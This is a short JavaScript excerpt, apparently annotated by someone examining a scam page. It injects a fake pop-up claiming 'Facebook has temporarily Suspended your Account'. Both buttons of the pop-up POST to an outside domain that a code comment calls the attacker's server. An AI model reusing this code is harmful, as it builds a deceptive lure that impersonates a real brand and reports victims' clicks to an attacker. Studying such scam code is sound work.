function InitTracking(config) {
    // This creates the Facebook popup
    if (config.source === 'facebook') {
        showFacebookPopup();
    }
}

function showFacebookPopup() {
    // THIS IS WHERE THE TEXT IS!
    const html = `
        <div id="modalbx">
            <div class="bxweb">
                <span id="modal-close">×</span>
                <img id="modal-image" src="logo-facebookpng-32251.jpg">
                <p id="modal-message">Facebook has temporarily Suspended your Account.</p>
                <div class="modal-buttons">
                    <button onclick="TrackConversion('Lead')" id="modal-accept" class="dismiss blinking">Accept</button>
                    <button onclick="TrackConversion('Lead')" id="modal-dismiss" class="dismiss blinking">Ignore</button>
                </div>
            </div>
        </div>
    `;
    document.body.insertAdjacentHTML('beforeend', html);
}

function TrackConversion(data) {
    // This sends data to the attacker's server
    fetch('https://sportserty.lol/track', {
        method: 'POST',
        body: JSON.stringify(data)
    });
}